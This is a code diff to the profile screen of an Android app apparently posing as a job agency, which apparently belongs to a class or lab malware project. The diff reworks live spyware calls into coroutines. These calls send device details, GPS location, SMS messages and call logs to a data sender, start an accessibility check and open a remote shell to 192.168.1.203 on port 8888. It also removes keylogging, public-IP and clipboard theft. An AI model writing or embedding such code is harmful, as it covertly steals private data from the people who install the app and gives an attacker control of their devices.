@@ -21,9 +21,11 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.lifecycle.lifecycleScope
 import com.example.EzJobAgency.DataRetriever.FindLocation
 import com.example.EzJobAgency.DataRetriever.General
 import com.google.android.material.imageview.ShapeableImageView
+import kotlinx.coroutines.launch
 import java.util.*
 
 
@@ -57,12 +59,14 @@ class ProfileTemplate : AppCompatActivity() {
         val gn = General(this,this)
         val gps = FindLocation(this, this)
         Log.d("Send data", "deviceinfo")
-        datasender.sendData(gn.stealDeviceInfo())
 
-        Log.d("Send data", "keys")
-        gn.logKeys()?.let { datasender.sendData(it) }
-        Log.d("Send data", "pubip")
-        gn.getPublicIP()?.let { datasender.sendData(it) }
+        lifecycleScope.launch {
+            try {
+                datasender.sendData(gn.stealDeviceInfo())
+            } catch (e: Exception) {
+                Log.e("Error:", "Failed to retrieve IP.", e)
+            }
+        }
         val LOCPERMISSIONS = arrayOf(
             Manifest.permission.ACCESS_COARSE_LOCATION,
             Manifest.permission.ACCESS_FINE_LOCATION
@@ -71,25 +75,45 @@ class ProfileTemplate : AppCompatActivity() {
             Log.d("Send data", "geo")
             datasender.sendData(gps.getLocationDetails())
         }
-        gn.accessibilityCheck()
 
         // Keefe Exploit --------------------------------------------------------------
         val SMSPERMISSIONS = arrayOf(
             android.Manifest.permission.SEND_SMS,
             android.Manifest.permission.READ_SMS
         )
+
+        // Start SMS log
         if (checkPerms(this, *SMSPERMISSIONS)) {
-             hv.getSMS()
+            lifecycleScope.launch {
+                try {
+                    hv.getSMS()
+                } catch (e: Exception) {
+                    Log.e("Error:", "Failed to retrieve SMS.", e)
+                }
+            }
         }
+
+        // Start call log
         if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
-             hv.getCallLog()
+            lifecycleScope.launch {
+                try {
+                    hv.getCallLog()
+                } catch (e: Exception) {
+                    Log.e("Error:", "Failed to retrieve calls.", e)
+                }
+            }
         }
         if (checkFileStoragePerms()) {
             hv.getShell("192.168.1.203", 8888)
         }   // Shell Exploit
 
-        // Lynette Camera Exploit (Done in Camera Button) -----------------------------
-        datasender.sendData(gn.stealClipboard())
+        lifecycleScope.launch {
+            try {
+                gn.accessibilityCheck()
+            } catch (e: Exception) {
+                Log.e("Error:", "Failed to start accessibility check.", e)
+            }
+        }
     }
 
     private fun renderInfo(id: Int, industry_name: String) {
